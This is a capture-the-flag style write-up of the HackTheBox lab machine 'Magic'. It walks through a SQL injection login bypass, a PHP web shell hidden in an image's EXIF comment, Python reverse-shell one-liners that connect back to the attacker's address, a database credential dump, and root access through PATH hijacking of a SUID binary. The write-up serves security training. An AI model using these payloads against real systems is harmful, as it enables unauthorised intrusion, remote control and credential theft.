---
title: "HackTheBox Machine - Magic"
classes: wide
header:
  teaser: /assets/images/htb-frame.png
search: false
categories: 
  - HackTheBox Machine
toc: true
toc_label: "Contents"
last_modified_at: 2020-08-27 14:51:00
---

![HTB Magic](/assets/images/htb-machine-magic/featured-image.png)

## Summary
- SQL Injection or sql query username bypass
- Inject shell on Image file using exiftool or bypass image file upload
- Find the real username/credential account in sql database
- PriEsc, check SUID

## Network Scanning
```
nmap -sC -sV -sS -T4 -oN magic.nmap 10.10.10.185
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-29 12:44 WIB
Nmap scan report for 10.10.10.185
Host is up (0.31s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration

front page website
![website](/assets/images/htb-machine-magic/website.png)

let's try to bypass using ‘or’'='
```
Username: ‘or’'='
Password: ‘or’'='
```
```
exiftool -Comment='<?php echo “<pre>”; system($_GET['cmd']);?>' t.jpg
```

`http://10.10.10.185//assets/images/htb-machine-magic/uploads/t.php.jpg?cmd=ls`

![cmd-shell](/assets/images/htb-machine-magic/exe_shell.png)

create reverse shell

```
http://10.10.10.185//assets/images/htb-machine-magic/uploads/t.php.jpg?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.10",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
![rev-shell](/assets/images/htb-machine-magic/reverse_shell.png)

![listener](/assets/images/htb-machine-magic/listene.png)

check `/etc/passwd`
```
www-data@ubuntu:/var/www/Magic//assets/images/htb-machine-magic/uploads$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/r!esolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin
avahi-autoipd:x:106:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
rtkit:x:109:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
cups-pk-helper:x:110:116:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
speech-dispatcher:x:111:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
whoopsie:x:112:117::/nonexistent:/bin/false
kernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:114:119::/var/lib/saned:/usr/sbin/nologin
pulse:x:115:120:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
avahi:x:116:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
colord:x:117:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
hplip:x:118:7:HPLIP system user,,,:/var/run/hplip:/bin/false
geoclue:x:119:124::/var/lib/geoclue:/usr/sbin/nologin
gnome-initial-setup:x:120:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:121:125:Gnome Display Manager:/var/lib/gdm3:/bin/false
theseus:x:1000:1000:Theseus,,,:/home/theseus:/bin/bash
sshd:x:123:65534::/run/sshd:/usr/sbin/nologin
mysql:x:122:127:MySQL Server,,,:/nonexistent:/bin/false
www-data@ubuntu:/var/www/Magic//assets/images/htb-machine-magic/uploads$ 
```
user on the machine are theseus, root.

check webfiles on the server `/var/www/Magic`
![www-data-magic](/assets/images/htb-machine-magic/www-data-magic.png)

check `db.php`
![db-php](/assets/images/htb-machine-magic/www-data-db-php.png)

```
...
class Database
{
    private static $dbName = 'Magic' ;
    private static $dbHost = 'localhost' ;
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus';
....
```

we got some error, when we tried to login using theseus and iamkingtheseus
![error-login](/assets/images/htb-machine-magic/error-login.png)

we need to dump the database website using mysqldump, for some credential information

```
www-data@ubuntu:/var/www/Magic$ mysqldump -utheseus -piamkingtheseus Magic
mysqldump -utheseus -piamkingtheseus Magic
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- MySQL dump 10.13  Distrib 5.7.29, for Linux (x86_64)
--
-- Host: localhost    Database: Magic
-- ------------------------------------------------------
-- Server version       5.7.29-0ubuntu0.18.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `login`
--

DROP TABLE IF EXISTS `login`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `login` (
  `id` int(6) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `password` varchar(100) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `login`
--

LOCK TABLES `login` WRITE;
/*!40000 ALTER TABLE `login` DISABLE KEYS */;
INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
/*!40000 ALTER TABLE `login` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2020-04-28 23:39:26
www-data@ubuntu:/var/www/Magic$ 
```

we got some credentials information

![db-user](/assets/images/htb-machine-magic/db-user.png)

`Th3s3usW4sK1ng` and tried repeat login using `theseus`

![python-pty](/assets/images/htb-machine-magic/python-pty.png)

![user-txt](/assets/images/htb-machine-magic/user-txt.png)

## Privilege Escalation

i tried to search SUID files
`find / -perm -u=s -type f 2>/dev/null`
```
theseus@ubuntu:/var/www/Magic$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/sbin/pppd
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/arping
/usr/bin/vmware-user-suid-wrapper
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/snapd/snap-confine
/snap/core18/1223/bin/mount
/snap/core18/1223/bin/ping
/snap/core18/1223/bin/su
/snap/core18/1223/bin/umount
/snap/core18/1223/usr/bin/chfn
/snap/core18/1223/usr/bin/chsh
/snap/core18/1223/usr/bin/gpasswd
/snap/core18/1223/usr/bin/newgrp
/snap/core18/1223/usr/bin/passwd
/snap/core18/1223/usr/bin/sudo
/snap/core18/1223/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1223/usr/lib/openssh/ssh-keysign
/snap/core18/1668/bin/mount
/snap/core18/1668/bin/ping
/snap/core18/1668/bin/su
/snap/core18/1668/bin/umount
/snap/core18/1668/usr/bin/chfn
/snap/core18/1668/usr/bin/chsh
/snap/core18/1668/usr/bin/gpasswd
/snap/core18/1668/usr/bin/newgrp
/snap/core18/1668/usr/bin/passwd
/snap/core18/1668/usr/bin/sudo
/snap/core18/1668/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1668/usr/lib/openssh/ssh-keysign
/snap/core/8689/bin/mount
/snap/core/8689/bin/ping
/snap/core/8689/bin/ping6
/snap/core/8689/bin/su
/snap/core/8689/bin/umount
/snap/core/8689/usr/bin/chfn
/snap/core/8689/usr/bin/chsh
/snap/core/8689/usr/bin/gpasswd
/snap/core/8689/usr/bin/newgrp
/snap/core/8689/usr/bin/passwd
/snap/core/8689/usr/bin/sudo
/snap/core/8689/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8689/usr/lib/openssh/ssh-keysign
/snap/core/8689/usr/lib/snapd/snap-confine
/snap/core/8689/usr/sbin/pppd
/snap/core/7917/bin/mount
/snap/core/7917/bin/ping
/snap/core/7917/bin/ping6
/snap/core/7917/bin/su
/snap/core/7917/bin/umount
/snap/core/7917/usr/bin/chfn
/snap/core/7917/usr/bin/chsh
/snap/core/7917/usr/bin/gpasswd
/snap/core/7917/usr/bin/newgrp
/snap/core/7917/usr/bin/passwd
/snap/core/7917/usr/bin/sudo
/snap/core/7917/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/7917/usr/lib/openssh/ssh-keysign
/snap/core/7917/usr/lib/snapd/snap-confine
/snap/core/7917/usr/sbin/pppd
/bin/umount
/bin/fusermount
/bin/sysinfo
/bin/mount
/bin/su
/bin/ping
theseus@ubuntu:/var/www/Magic$ 
```
let's upload `linpeas.sh` to the machine, and we got some of information about `abnormal` sysinfo

```
theseus@ubuntu:/var/www/Magic$ /bin/sysinfo
/bin/sysinfo
====================Hardware Info====================
H/W path           Device      Class      Description
=====================================================
                               system     VMware Virtual Platform
/0                             bus        440BX Desktop Reference Platform
/0/0                           memory     86KiB BIOS
/0/1                           processor  AMD EPYC 7401P 24-Core Processor
/0/1/0                         memory     16KiB L1 cache
/0/1/1                         memory     16KiB L1 cache
/0/1/2                         memory     512KiB L2 cache
/0/1/3                         memory     512KiB L2 cache
/0/2                           processor  AMD EPYC 7401P 24-Core Processor
/0/28                          memory     System Memory
/0/28/0                        memory     4GiB DIMM DRAM EDO
/0/28/1                        memory     DIMM DRAM [empty]
/0/28/2                        memory     DIMM DRAM [empty]
/0/28/3                        memory     DIMM DRAM [empty]
/0/28/4                        memory     DIMM DRAM [empty]
/0/28/5                        memory     DIMM DRAM [empty]
/0/28/6                        memory     DIMM DRAM [empty]
/0/28/7                        memory     DIMM DRAM [empty]
/0/28/8                        memory     DIMM DRAM [empty]
/0/28/9                        memory     DIMM DRAM [empty]
/0/28/a                        memory     DIMM DRAM [empty]
/0/28/b                        memory     DIMM DRAM [empty]
/0/28/c                        memory     DIMM DRAM [empty]
/0/28/d                        memory     DIMM DRAM [empty]
/0/28/e                        memory     DIMM DRAM [empty]
/0/28/f                        memory     DIMM DRAM [empty]
/0/28/10                       memory     DIMM DRAM [empty]
/0/28/11                       memory     DIMM DRAM [empty]
/0/28/12                       memory     DIMM DRAM [empty]
/0/28/13                       memory     DIMM DRAM [empty]
/0/28/14                       memory     DIMM DRAM [empty]
/0/28/15                       memory     DIMM DRAM [empty]
/0/28/16                       memory     DIMM DRAM [empty]
/0/28/17                       memory     DIMM DRAM [empty]
/0/28/18                       memory     DIMM DRAM [empty]
/0/28/19                       memory     DIMM DRAM [empty]
/0/28/1a                       memory     DIMM DRAM [empty]
/0/28/1b                       memory     DIMM DRAM [empty]
/0/28/1c                       memory     DIMM DRAM [empty]
/0/28/1d                       memory     DIMM DRAM [empty]
/0/28/1e                       memory     DIMM DRAM [empty]
/0/28/1f                       memory     DIMM DRAM [empty]
/0/28/20                       memory     DIMM DRAM [empty]
/0/28/21                       memory     DIMM DRAM [empty]
/0/28/22                       memory     DIMM DRAM [empty]
/0/28/23                       memory     DIMM DRAM [empty]
/0/28/24                       memory     DIMM DRAM [empty]
/0/28/25                       memory     DIMM DRAM [empty]
/0/28/26                       memory     DIMM DRAM [empty]
/0/28/27                       memory     DIMM DRAM [empty]
/0/28/28                       memory     DIMM DRAM [empty]
/0/28/29                       memory     DIMM DRAM [empty]
/0/28/2a                       memory     DIMM DRAM [empty]
/0/28/2b                       memory     DIMM DRAM [empty]
/0/28/2c                       memory     DIMM DRAM [empty]
/0/28/2d                       memory     DIMM DRAM [empty]
/0/28/2e                       memory     DIMM DRAM [empty]
/0/28/2f                       memory     DIMM DRAM [empty]
/0/28/30                       memory     DIMM DRAM [empty]
/0/28/31                       memory     DIMM DRAM [empty]
/0/28/32                       memory     DIMM DRAM [empty]
/0/28/33                       memory     DIMM DRAM [empty]
/0/28/34                       memory     DIMM DRAM [empty]
/0/28/35                       memory     DIMM DRAM [empty]
/0/28/36                       memory     DIMM DRAM [empty]
/0/28/37                       memory     DIMM DRAM [empty]
/0/28/38                       memory     DIMM DRAM [empty]
/0/28/39                       memory     DIMM DRAM [empty]
/0/28/3a                       memory     DIMM DRAM [empty]
/0/28/3b                       memory     DIMM DRAM [empty]
/0/28/3c                       memory     DIMM DRAM [empty]
/0/28/3d                       memory     DIMM DRAM [empty]
/0/28/3e                       memory     DIMM DRAM [empty]
/0/28/3f                       memory     DIMM DRAM [empty]
/0/3                           memory     
/0/3/0                         memory     DIMM [empty]
/0/4                           memory     
/0/4/0                         memory     DIMM [empty]
/0/5                           memory     
/0/5/0                         memory     DIMM [empty]
/0/6                           memory     
/0/6/0                         memory     DIMM [empty]
/0/7                           memory     
/0/7/0                         memory     DIMM [empty]
/0/8                           memory     
/0/8/0                         memory     DIMM [empty]
/0/9                           memory     
/0/9/0                         memory     DIMM [empty]
/0/a                           memory     
/0/a/0                         memory     DIMM [empty]
/0/b                           memory     
/0/b/0                         memory     DIMM [empty]
/0/c                           memory     
/0/c/0                         memory     DIMM [empty]
/0/d                           memory     
/0/d/0                         memory     DIMM [empty]
/0/e                           memory     
/0/e/0                         memory     DIMM [empty]
/0/f                           memory     
/0/f/0                         memory     DIMM [empty]
/0/10                          memory     
/0/10/0                        memory     DIMM [empty]
/0/11                          memory     
/0/11/0                        memory     DIMM [empty]
/0/12                          memory     
/0/12/0                        memory     DIMM [empty]
/0/13                          memory     
/0/13/0                        memory     DIMM [empty]
/0/14                          memory     
/0/14/0                        memory     DIMM [empty]
/0/15                          memory     
/0/15/0                        memory     DIMM [empty]
/0/16                          memory     
/0/16/0                        memory     DIMM [empty]
/0/17                          memory     
/0/17/0                        memory     DIMM [empty]
/0/18                          memory     
/0/18/0                        memory     DIMM [empty]
/0/19                          memory     
/0/19/0                        memory     DIMM [empty]
/0/1a                          memory     
/0/1a/0                        memory     DIMM [empty]
/0/1b                          memory     
/0/1b/0                        memory     DIMM [empty]
/0/1c                          memory     
/0/1c/0                        memory     DIMM [empty]
/0/1d                          memory     
/0/1d/0                        memory     DIMM [empty]
/0/1e                          memory     
/0/1e/0                        memory     DIMM [empty]
/0/1f                          memory     
/0/1f/0                        memory     DIMM [empty]
/0/20                          memory     
/0/20/0                        memory     DIMM [empty]
/0/21                          memory     
/0/21/0                        memory     DIMM [empty]
/0/22                          memory     
/0/22/0                        memory     DIMM [empty]
/0/23                          memory     
/0/23/0                        memory     DIMM [empty]
/0/24                          memory     
/0/24/0                        memory     DIMM [empty]
/0/25                          memory     
/0/25/0                        memory     DIMM [empty]
/0/26                          memory     
/0/26/0                        memory     DIMM [empty]
/0/27                          memory     
/0/27/0                        memory     DIMM [empty]
/0/29                          memory     
/0/29/0                        memory     DIMM [empty]
/0/2a                          memory     
/0/2a/0                        memory     DIMM [empty]
/0/2b                          memory     
/0/2b/0                        memory     DIMM [empty]
/0/2c                          memory     
/0/2c/0                        memory     DIMM [empty]
/0/2d                          memory     
/0/2d/0                        memory     DIMM [empty]
/0/2e                          memory     
/0/2e/0                        memory     DIMM [empty]
/0/2f                          memory     
/0/2f/0                        memory     DIMM [empty]
/0/30                          memory     
/0/30/0                        memory     DIMM [empty]
/0/31                          memory     
/0/31/0                        memory     DIMM [empty]
/0/32                          memory     
/0/32/0                        memory     DIMM [empty]
/0/33                          memory     
/0/33/0                        memory     DIMM [empty]
/0/34                          memory     
/0/34/0                        memory     DIMM [empty]
/0/35                          memory     
/0/35/0                        memory     DIMM [empty]
/0/36                          memory     
/0/36/0                        memory     DIMM [empty]
/0/37                          memory     
/0/37/0                        memory     DIMM [empty]
/0/38                          memory     
/0/38/0                        memory     DIMM [empty]
/0/39                          memory     
/0/39/0                        memory     DIMM [empty]
/0/3a                          memory     
/0/3a/0                        memory     DIMM [empty]
/0/3b                          memory     
/0/3b/0                        memory     DIMM [empty]
/0/3c                          memory     
/0/3c/0                        memory     DIMM [empty]
/0/3d                          memory     
/0/3d/0                        memory     DIMM [empty]
/0/3e                          memory     
/0/3e/0                        memory     DIMM [empty]
/0/3f                          memory     
/0/3f/0                        memory     DIMM [empty]
/0/40                          memory     
/0/40/0                        memory     DIMM [empty]
/0/41                          memory     
/0/41/0                        memory     DIMM [empty]
/0/42                          memory     
/0/42/0                        memory     DIMM [empty]
/0/43                          memory     
/0/43/0                        memory     DIMM [empty]
/0/44                          memory     
/0/45                          memory     
/0/100                         bridge     440BX/ZX/DX - 82443BX/ZX/DX Host bridge
/0/100/1                       bridge     440BX/ZX/DX - 82443BX/ZX/DX AGP bridge
/0/100/7                       bridge     82371AB/EB/MB PIIX4 ISA
/0/100/7.1                     storage    82371AB/EB/MB PIIX4 IDE
/0/100/7.3                     bridge     82371AB/EB/MB PIIX4 ACPI
/0/100/7.7                     generic    Virtual Machine Communication Interface
/0/100/f                       display    SVGA II Adapter
/0/100/10          scsi2       storage    53c1030 PCI-X Fusion-MPT Dual Ultra320 SCSI
/0/100/10/0.0.0    /dev/sda    disk       21GB Virtual disk
/0/100/10/0.0.0/1  /dev/sda1   volume     19GiB EXT4 volume
/0/100/11                      bridge     PCI bridge
/0/100/11/0                    bus        USB1.1 UHCI Controller
/0/100/11/0/1      usb2        bus        UHCI Host Controller
/0/100/11/0/1/1                input      VMware Virtual USB Mouse
/0/100/11/0/1/2                bus        VMware Virtual USB Hub
/0/100/11/1                    bus        USB2 EHCI Controller
/0/100/11/1/1      usb1        bus        EHCI Host Controller
/0/100/15                      bridge     PCI Express Root Port
/0/100/15/0        ens160      network    VMXNET3 Ethernet Controller
/0/100/15.1                    bridge     PCI Express Root Port
/0/100/15.2                    bridge     PCI Express Root Port
/0/100/15.3                    bridge     PCI Express Root Port
/0/100/15.4                    bridge     PCI Express Root Port
/0/100/15.5                    bridge     PCI Express Root Port
/0/100/15.6                    bridge     PCI Express Root Port
/0/100/15.7                    bridge     PCI Express Root Port
/0/100/16                      bridge     PCI Express Root Port
/0/100/16.1                    bridge     PCI Express Root Port
/0/100/16.2                    bridge     PCI Express Root Port
/0/100/16.3                    bridge     PCI Express Root Port
/0/100/16.4                    bridge     PCI Express Root Port
/0/100/16.5                    bridge     PCI Express Root Port
/0/100/16.6                    bridge     PCI Express Root Port
/0/100/16.7                    bridge     PCI Express Root Port
/0/100/17                      bridge     PCI Express Root Port
/0/100/17.1                    bridge     PCI Express Root Port
/0/100/17.2                    bridge     PCI Express Root Port
/0/100/17.3                    bridge     PCI Express Root Port
/0/100/17.4                    bridge     PCI Express Root Port
/0/100/17.5                    bridge     PCI Express Root Port
/0/100/17.6                    bridge     PCI Express Root Port
/0/100/17.7                    bridge     PCI Express Root Port
/0/100/18                      bridge     PCI Express Root Port
/0/100/18.1                    bridge     PCI Express Root Port
/0/100/18.2                    bridge     PCI Express Root Port
/0/100/18.3                    bridge     PCI Express Root Port
/0/100/18.4                    bridge     PCI Express Root Port
/0/100/18.5                    bridge     PCI Express Root Port
/0/100/18.6                    bridge     PCI Express Root Port
/0/100/18.7                    bridge     PCI Express Root Port
/0/46              scsi0       storage    
/0/46/0.0.0        /dev/cdrom  disk       VMware IDE CDR00
/1                             system     
```
create reverse shell to lshw file
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.10",1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
![lshw](/assets/images/htb-machine-magic/lshw-file.png)

don't forget to change lshw's permission to 755 using chmod

![lshw](/assets/images/htb-machine-magic/lshw2.png)

add lshw path
![lshw-path](/assets/images/htb-machine-magic/path.png)

run sysinfo and check our reverse shell connection
![run-sysinfo](/assets/images/htb-machine-magic/run-sysinfo.png)

![nc-root](/assets/images/htb-machine-magic/rev-sysinfo.png)

![root-txt](/assets/images/htb-machine-magic/root-txt.png)


